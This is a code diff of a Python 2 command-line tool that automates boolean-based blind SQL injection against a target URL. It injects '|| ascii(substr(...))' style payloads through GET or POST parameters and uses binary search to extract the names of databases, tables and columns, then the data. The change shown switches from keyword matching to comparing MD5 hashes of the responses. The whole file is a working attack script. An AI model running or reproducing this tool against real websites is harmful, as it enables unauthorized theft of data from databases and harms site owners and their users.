@@ -2,12 +2,13 @@
 # author:End1ng
 
 import requests
-import threading
+# import threading
 import logging
 import argparse
 import sys
 from time import sleep
 from binascii import hexlify
+import hashlib
 
 def Argparse():
 
@@ -38,12 +39,9 @@ def Argparse():
 
     args.add_argument('--dump',action="store_true", help=u'读取字段')
 
-    args.add_argument('-o','--ok_word',metavar=u'str',help=u'正确页面关键词')
-    args.add_argument('-n','--no_word',metavar=u'str',help=u'错误页面关键词')
-
     other = parser.add_argument_group('other arguments')
     other.add_argument('--level',metavar=u'level',help=u'程序运行级别:CRITICAL,ERROR,WARNING,INFO,DEBUG,NOTSET')
-    other.add_argument('--delay',metavar=u'num',help=u'访问延迟')
+    other.add_argument('--delay',metavar=u'num',default=0,help=u'访问延迟')
     other.add_argument('--cookie',metavar=u'str',help=u'cookie')
 
     args=parser.parse_args()
@@ -55,11 +53,6 @@ def Argparse():
     if not args['url']:
         print u"请输入url"
         sys.exit()
-    if not args["no_word"]:
-        print u"请输入错误页面关键词"
-        sys.exit()
-    if not args["delay"]:
-        args["delay"] = 0
     return args
 
 class classlog(object):
@@ -101,9 +94,10 @@ class classlog(object):
 
 class MyBoolSqli():
     """docstring for ClassName"""
-    def __init__(self, target_url, ok_word, no_word):
+    def __init__(self, target_url):
 
         self.target_url = target_url
+        self.hashvalue = self.run_url('')
 
         self.payload_len = " || length(({value})) {opt} {asc_num} limit 1-- -"
         self.payload_asc = " || ascii(substr(({value}),{asc_pos},1)) {opt} {asc_num} limit 1-- -"
@@ -119,28 +113,9 @@ class MyBoolSqli():
         self.payload_asc_gt = self.payload_asc.format(value="{value}", asc_pos="{asc_pos}", asc_num="{asc_num}", opt=">")
         self.payload_asc_lt = self.payload_asc.format(value="{value}", asc_pos="{asc_pos}", asc_num="{asc_num}", opt="<")
 
-    def run_get_database(self):
-        payload = self.payload_database
-        res = self.get_asc(payload)
-
-    def run_get_tables(self, database):
-        payload = self.payload_tables.format(database="0x" + hexlify(database))
-        res = self.get_asc(payload)
-
-    def run_get_columns(self, database, table_name):
-        payload = self.payload_columns.format(database="0x" + hexlify(database), table_name="0x" + hexlify(table_name))
-        res = self.get_asc(payload)
-
-    def run_get_data(self, database, table_name, columns):
-        payload = self.payload_data.format(table_name=table_name, columns=columns)
-        res = self.get_asc(payload)
-
-    def run_url(self, url, payload):
+    def run_url(self, payload):
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0'}
         try:
-            proxies = {
-              "http": "http://127.0.0.1:8080",
-            }
             if ARGV["post"]:
                 data = {}
                 for x in ARGV["post"]:
@@ -149,21 +124,12 @@ class MyBoolSqli():
                         data[x[0][1:]] = x[1] + payload
                     else:
                         data[x[0]] = x[1]
-                r = requests.post(url, headers=headers, data=data)
-                # print url, data
+                r = requests.post(self.target_url, headers=headers, data=data)
             else:
-                r = requests.get(url + payload, headers=headers)
-                # print url + payload
-            if ok_word:
-                if ok_word in r.text:
-                    return True
-            elif no_word in r.text:
-                return False
-            else:
-                return True
+                r = requests.get(self.target_url + payload, headers=headers)
+            return self.getmd5(r.content)
 
-        except Exception, e:
-            raise
+        except:
             LOG.info(u"连接失败")
             sys.exit()
 
@@ -175,18 +141,18 @@ class MyBoolSqli():
         while True:
             LOG.debug(u"长度 " + str(int(num)))
             sleep(ARGV["delay"])
-            if self.run_url(self.target_url, self.payload_len_lt.format(value=value, asc_num=int(num))):
+            if self.run_url(self.payload_len_lt.format(value=value, asc_num=int(num))) != self.hashvalue:
                 pre_l = num
                 num = round((num + pre_g) / 2)
 
-            elif self.run_url(self.target_url, self.payload_len_gt.format(value=value, asc_num=int(num))):
+            elif self.run_url(self.payload_len_gt.format(value=value, asc_num=int(num))) != self.hashvalue:
                 pre_g = num
                 if pre_l > num:
                     num = round((num + pre_l) / 2)
                 else:
                     num = round((num + round(num / 2)))
 
-            elif self.run_url(self.target_url, self.payload_len_eq.format(value=value, asc_num=int(num))):
+            elif self.run_url(self.payload_len_eq.format(value=value, asc_num=int(num))) != self.hashvalue:
                 LOG.info(u"数据总长度 " + str(int(num)))
                 return int(num)
 
@@ -207,11 +173,11 @@ class MyBoolSqli():
             while True:
                 LOG.debug(u"第 " + str(x) + u" 位 " + str(int(num)))
                 sleep(ARGV["delay"])
-                if self.run_url(self.target_url, self.payload_asc_lt.format(value=value, asc_pos=x, asc_num=int(num))):
+                if self.run_url(self.payload_asc_lt.format(value=value, asc_pos=x, asc_num=int(num))) != self.hashvalue:
                     pre_l = num
                     num = round((num + pre_g) / 2)
 
-                elif self.run_url(self.target_url, self.payload_asc_gt.format(value=value, asc_pos=x, asc_num=int(num))):
+                elif self.run_url(self.payload_asc_gt.format(value=value, asc_pos=x, asc_num=int(num))) != self.hashvalue:
                     pre_g = num
                     if pre_l > num:
                         num = round((num + pre_l) / 2)
@@ -226,17 +192,34 @@ class MyBoolSqli():
                     break
         print "\n+" + "-" * 22 + "+"
 
+    def getmd5(self, src):
+        m = hashlib.md5()
+        m.update(src)
+        return m.hexdigest()
+
+    def run_get_database(self):
+        payload = self.payload_database
+        res = self.get_asc(payload)
+
+    def run_get_tables(self, database):
+        payload = self.payload_tables.format(database="0x" + hexlify(database))
+        res = self.get_asc(payload)
+
+    def run_get_columns(self, database, table_name):
+        payload = self.payload_columns.format(database="0x" + hexlify(database), table_name="0x" + hexlify(table_name))
+        res = self.get_asc(payload)
+
+    def run_get_data(self, database, table_name, columns):
+        payload = self.payload_data.format(table_name=table_name, columns=columns)
+        res = self.get_asc(payload)
+
 ARGV = Argparse()
 LOG = classlog("log.txt", ARGV["level"])
 
 for i,j in ARGV.items():
     LOG.debug(str(i).ljust(8) + ": " + str(j))
 
-target_url = ARGV["url"]
-ok_word = ARGV["ok_word"]
-no_word = ARGV["no_word"]
-
-lll = MyBoolSqli(target_url, ok_word, no_word)
+lll = MyBoolSqli(ARGV["url"])
 
 try:
     if ARGV["dbs"]:
@@ -251,5 +234,4 @@ try:
             value += x + ",0x20,"
         lll.run_get_data(ARGV["D"], ARGV["T"], value[:-6])
 except:
-    raise
     LOG.error(u"错误")
